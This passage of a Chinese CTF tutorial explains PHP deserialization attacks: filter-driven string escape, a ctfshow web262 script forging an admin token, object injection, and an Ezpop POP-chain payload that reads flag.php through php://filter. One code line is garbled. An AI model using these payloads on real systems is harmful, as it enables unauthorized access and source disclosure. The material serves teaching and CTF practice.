+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1">?name=abcxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;whoami&quot;;}
+</span></code></pre></div></td></tr></table></div>
+<p>输出如下：<img alt="3" src="../PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/3.jpg" /></p>
+<p><strong>解释：</strong></p>
+<p>当我们构造name时，在abc后写18个x，而且后面 <code>";i:1;s:4:"flag";}</code> 也是18的长度</p>
+<p>在进行change时，这里的18个x就变成了36个x，刚好符合序列化时的长度</p>
+<p>从而造成<code>";i:1;s:4:"flag";}</code>溢出，前面的<code>"</code>闭合前串，后面的<code>;}</code>闭合反序列化的全过程</p>
+<p>而先前存在的$age被舍弃（因为这里数组只有两个元素），不影响反序列化的过程</p>
+<p><strong>总之，age变量被我们控制</strong></p>
+<h4 id="2-x">2. 过滤后字符变少(把反序列化后的两个x替换成为一个)<a class="headerlink" href="#2-x" title="Permanent link">&para;</a></h4>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-23-2"><span class="k">function</span> <span class="nf">change</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+</span><span id="__span-23-3"><span class="p">{</span>
+</span><span id="__span-23-4">    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;xx&quot;</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
+</span><span id="__span-23-5"><span class="p">}</span>
+</span><span id="__span-23-6">
+</span><span id="__span-23-7"><span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+</span><span id="__span-23-8"><span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">];</span>
+</span><span id="__span-23-9"><span class="k">echo</span> <span class="s2">&quot;反序列化字符串：&quot;</span><span class="p">;</span>
+</span><span id="__span-23-10"><span class="nb">var_dump</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
+</span><span id="__span-23-11"><span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-23-12"><span class="k">echo</span> <span class="s2">&quot;过滤后:&quot;</span><span class="p">;</span>
+</span><span id="__span-23-13"><span class="nv">$old</span> <span class="o">=</span> <span class="nx">change</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
+</span><span id="__span-23-14"><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$old</span><span class="p">);</span>
+</span><span id="__span-23-15"><span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-23-16"><span class="nv">$new</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$old</span><span class="p">);</span>
+</span><span id="__span-23-17"><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$new</span><span class="p">);</span>
+</span><span id="__span-23-18"><span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;此时，age=&quot;</span><span class="p">;</span>
+</span><span id="__span-23-19"><span class="k">echo</span> <span class="nv">$new</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">];</span>
+</span></code></pre></div></td></tr></table></div>
+<p>正常情况传入<code>name=mao&amp;age=11</code>的结果：</p>
+<p><img alt="4" src="../PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/4.jpg" /></p>
+<p>构造：</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1">?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11&quot;;s:3:&quot;age&quot;;s:6:&quot;whoami&quot;;}
+</span></code></pre></div></td></tr></table></div>
+<p>这里的40个x经过滤后就变为了20个x，但是在前面的长度还是40，所以后面的20个字符被“吃掉”</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1">s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;}&quot;
+</span></code></pre></div></td></tr></table></div>
+<p>注意 <code>";s:3:"age";s:28</code>: 这一部分本来就有，后面的 <code>;s:3:"age";s:6:"whoami";}</code> 为我们所构造的</p>
+<p><strong>age被我们控制</strong></p>
+<p><strong>ctfshow web262</strong></p>
+<p>脚本：</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-26-2"><span class="k">class</span> <span class="nc">message</span>
+</span><span id="__span-26-3"><span class="p">{</span>
+</span><span id="__span-26-4">    <span class="k">public</span> <span class="nv">$from</span><span class="p">;</span>
+</span><span id="__span-26-5">    <span class="k">public</span> <span class="nv">$msg</span><span class="p">;</span>
+</span><span id="__span-26-6">    <span class="k">public</span> <span class="nv">$to</span><span class="p">;</span>
+</span><span id="__span-26-7">    <span class="k">public</span> <span class="nv">$token</span> <span class="o">=</span> <span class="s1">&#39;user&#39;</span><span class="p">;</span>
+</span><span id="__span-26-8">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$m</span><span class="p">,</span> <span class="nv">$t</span><span class="p">)</span>
+</span><span id="__span-26-9">    <span class="p">{</span>
+</span><span id="__span-26-10">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">from</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
+</span><span id="__span-26-11">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">msg</span> <span class="o">=</span> <span class="nv">$m</span><span class="p">;</span>
+</span><span id="__span-26-12">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">to</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
+</span><span id="__span-26-13">    <span class="p">}</span>
+</span><span id="__span-26-14"><span class="p">}</span>
+</span><span id="__span-26-15"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span>
+</span><span id="__span-26-16"><span class="p">{</span>
+</span><span id="__span-26-17">    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;fuck&#39;</span><span class="p">,</span> <span class="s1">&#39;loveU&#39;</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">);</span>
+</span><span id="__span-26-18"><span class="p">}</span>
+</span><span id="__span-26-19"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">new</span>
+</span><span id="__span-26-20"><span class="nx">message</span><span class="p">(</span><span class="s1">&#39;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuc</span>
+</span><span id="__span-26-21"><span class="s1">kfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuc</span>
+</span><span id="__span-26-22"><span class="s1">kfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuc</span>
+</span><span id="__span-26-23"><span class="s1">kfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span>
+</span><span id="__span-26-24"><span class="p">);</span>
+</span><span id="__span-26-25">
+</span><span id="__span-26-26"><span class="nv">$msg_1</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$msg</span><span class="p">);</span>
+</span><span id="__span-26-27">
+</span><span id="__span-26-28"><span class="k">echo</span> <span class="nv">$msg_1</span><span class="p">;</span>
+</span><span id="__span-26-29">
+</span><span id="__span-26-30"><span class="nv">$msg_2</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$msg_1</span><span class="p">);</span>
+</span><span id="__span-26-31">
+</span><span id="__span-26-32"><span class="k">echo</span> <span class="nv">$msg_2</span><span class="p">;</span>
+</span><span id="__span-26-33">
+</span><span id="__span-26-34"><span class="c1">//O:7:&quot;message&quot;:4:</span>
+</span><span id="__span-26-35"><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&quot;from&quot;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">310</span><span class="o">:</span><span class="s2">&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUl</span>
+</span><span id="__span-26-36"><span class="s2">oveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUl</span>
+</span><span id="__span-26-37"><span class="s2">oveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUl</span>
+</span><span id="__span-26-38"><span class="s2">oveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUl</span>
+</span><span id="__span-26-39"><span class="s2">oveUloveU&quot;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&quot;msg&quot;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&quot;b&quot;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">&quot;to&quot;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&quot;c&quot;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&quot;token&quot;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&quot;admin&quot;</span><span class="p">;}</span><span class="s2">&quot;;s:3:&quot;</span><span class="nx">ms</span>
+</span><span id="__span-26-40"><span class="nx">g</span><span class="s2">&quot;;s:1:&quot;</span><span class="nx">b</span><span class="s2">&quot;;s:2:&quot;</span><span class="nx">to</span><span class="s2">&quot;;s:1:&quot;</span><span class="nx">c</span><span class="s2">&quot;;s:5:&quot;</span><span class="nx">token</span><span class="s2">&quot;;s:4:&quot;</span><span class="nx">user</span><span class="s2">&quot;;}</span>
+</span><span id="__span-26-41"><span class="s2">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="_9">对象注入<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<p>当用户的请求在传给反序列化函数 unserialize() 之前没有被正确的过滤时就会产生漏洞。</p>
+<p>因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 unserialize 函数</p>
+<p>最终导致一个在该应用范围内的任意PHP对象注入。</p>
+<p><strong>前提需要满足两个条件</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1">1、unserialize的参数可控。
+</span><span id="__span-27-2">2、代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数
+</span></code></pre></div></td></tr></table></div>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-28-2"><span class="k">class</span> <span class="nc">A</span>
+</span><span id="__span-28-3"><span class="p">{</span>
+</span><span id="__span-28-4">    <span class="k">public</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">&quot;12345&quot;</span><span class="p">;</span>
+</span><span id="__span-28-5">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span><span id="__span-28-6">    <span class="p">{</span>
+</span><span id="__span-28-7">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
+</span><span id="__span-28-8">    <span class="p">}</span>
+</span><span id="__span-28-9"><span class="p">}</span>
+</span><span id="__span-28-10"><span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;23456&quot;;}&#39;</span><span class="p">;</span>
+</span><span id="__span-28-11"><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
+<p>脚本结束时会调用<code>__destruct()</code>函数，同时会覆盖test变量输出 23456</p>
+<h2 id="pop">POP链简单介绍<a class="headerlink" href="#pop" title="Permanent link">&para;</a></h2>
+<p>前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p>
+<p><strong>简单案例MRCTF2020-Ezpop</strong></p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><span class="x">Welcome to index.php</span>
+</span><span id="__span-29-2"><span class="cp">&lt;?php</span>
+</span><span id="__span-29-3"><span class="k">class</span> <span class="nc">Modifier</span>
+</span><span id="__span-29-4"><span class="p">{</span>
+</span><span id="__span-29-5">    <span class="k">protected</span> <span class="nv">$var</span><span class="p">;</span>
+</span><span id="__span-29-6">    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
+</span><span id="__span-29-7">    <span class="p">{</span>
+</span><span id="__span-29-8">        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span><span id="__span-29-9">    <span class="p">}</span>
+</span><span id="__span-29-10">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span><span id="__span-29-11">    <span class="p">{</span> <span class="c1">//当尝试将对象调用为函数时触发</span>
+</span><span id="__span-29-12">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
+</span><span id="__span-29-13">    <span class="p">}</span>
+</span><span id="__span-29-14"><span class="p">}</span>
+</span><span id="__span-29-15"><span class="nv">$a</span> <span class="nv">$b</span>
+</span><span id="__span-29-16"><span class="k">class</span> <span class="nc">Show</span>
+</span><span id="__span-29-17"><span class="p">{</span>
+</span><span id="__span-29-18">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span><span id="__span-29-19">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span><span id="__span-29-20">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">)</span>
+</span><span id="__span-29-21">    <span class="p">{</span>
+</span><span id="__span-29-22">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+</span><span id="__span-29-23">        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-29-24">    <span class="p">}</span>
+</span><span id="__span-29-25">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span><span id="__span-29-26">    <span class="p">{</span> <span class="c1">//把类当作字符串使用时触发</span>
+</span><span id="__span-29-27">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+</span><span id="__span-29-28">    <span class="p">}</span>
+</span><span id="__span-29-29">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span><span id="__span-29-30">    <span class="p">{</span>
+</span><span id="__span-29-31">        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-29-32">            <span class="k">echo</span> <span class="s2">&quot;hacker&quot;</span><span class="p">;</span>
+</span><span id="__span-29-33">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&quot;index.php&quot;</span><span class="p">;</span>
+</span><span id="__span-29-34">        <span class="p">}</span>
+</span><span id="__span-29-35">    <span class="p">}</span>
+</span><span id="__span-29-36"><span class="p">}</span>
+</span><span id="__span-29-37"><span class="k">class</span> <span class="nc">Test</span>
+</span><span id="__span-29-38"><span class="p">{</span>
+</span><span id="__span-29-39">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
+</span><span id="__span-29-40">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-29-41">    <span class="p">{</span>
+</span><span id="__span-29-42">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span><span id="__span-29-43">    <span class="p">}</span>
+</span><span id="__span-29-44">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
+</span><span id="__span-29-45">    <span class="p">{</span> <span class="c1">//当调用一个不存在的或者是无法访问的属性的时候被调用</span>
+</span><span id="__span-29-46">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
+</span><span id="__span-29-47">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
+</span><span id="__span-29-48">    <span class="p">}</span>
+</span><span id="__span-29-49"><span class="p">}</span>
+</span><span id="__span-29-50"><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span id="__span-29-51">    <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]);</span>
+</span><span id="__span-29-52"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-29-53">    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">;</span>
+</span><span id="__span-29-54">    <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-29-55"><span class="p">}</span>
+</span><span id="__span-29-56"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>共有3个类，反序列化会调用<strong>wakeup</strong>，存在于Show类wake中的<code>$this-&gt;source</code>可控，也就是Show中<code>$source</code>变量可控</p>
+<p>思路：将<code>$source</code>构造成一个对象Show，当<code>$source</code>为一个对象时。就会执行Show类中的toString 此时将<code>$str</code>指向Test类</p>
+<p><code>$this-&gt;str-&gt;source</code>：取str类中的source值，使这个值自动调用get</p>
+<p>此时将<code>$p</code>构造成<code>new Modifier</code></p>
+<p><code>return $function()</code> 表示将function当作函数返回 当类变量直接当作函数调用的时候，就会调用魔术方法<code>__invoke</code></p>
+<p>然后将$var构造成读取源码即可</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1">$var = &#39;php://filter/read=convert.base64-encode/recource=flag.php&#39;;
+</span></code></pre></div></td></tr></table></div>
+<p>payload：</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-31-2"><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;memory_limit&#39;</span><span class="p">,</span> <span class="s1">&#39;-1&#39;</span><span class="p">);</span>
+</span><span id="__span-31-3"><span class="k">class</span> <span class="nc">Modifier</span>
+</span><span id="__span-31-4"><span class="p">{</span>
+</span><span id="__span-31-5">    <span class="k">protected</span> <span class="nv">$var</span> <span class="o">=</span> <span class="s1">&#39;php://filter/read=convert.base64-</span>
+</span><span id="__span-31-6"><span class="s1">encode/resource=flag.php&#39;</span><span class="p">;</span>
+</span><span id="__span-31-7"><span class="p">}</span>
+</span><span id="__span-31-8"><span class="k">class</span> <span class="nc">Show</span>
+</span><span id="__span-31-9"><span class="p">{</span>
+</span><span id="__span-31-10">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span><span id="__span-31-11">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span><span id="__span-31-12">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
+</span><span id="__span-31-13">    <span class="p">{</span>
+</span><span id="__span-31-14">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+</span><span id="__span-31-15">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
+</span><span id="__span-31-16">    <span class="p">}</span>
+</span><span id="__span-31-17"><span class="p">}</span>
+</span><span id="__span-31-18"><span class="k">class</span> <span class="nc">Test</span>
+</span><span id="__span-31-19"><span class="p">{</span>
+</span><span id="__span-31-20">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
+</span><span id="__span-31-21">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-31-22">    <span class="p">{</span>
+</span><span id="__span-31-23">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Modifier</span><span class="p">();</span>
+</span><span id="__span-31-24">    <span class="p">}</span>
+</span><span id="__span-31-25"><span class="p">}</span>
+</span><span id="__span-31-26"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">);</span>
+</span><span id="__span-31-27"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-31-28"><span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span><span id="__span-31-29"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>来自：<a href="https://www.bilibili.com/video/av4142669">https://www.bilibili.com/video/av4142669</a></p>
+<h2 id="php_2">PHP原生类反序列化利用（暂无）<a class="headerlink" href="#php_2" title="Permanent link">&para;</a></h2>
+<h2 id="phar">Phar反序列化<a class="headerlink" href="#phar" title="Permanent link">&para;</a></h2>
+<p><strong>ctfshow 276</strong></p>
+<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。</p>
+<p>当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</p>
+<h3 id="phar_1">什么是phar文件<a class="headerlink" href="#phar_1" title="Permanent link">&para;</a></h3>
+<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
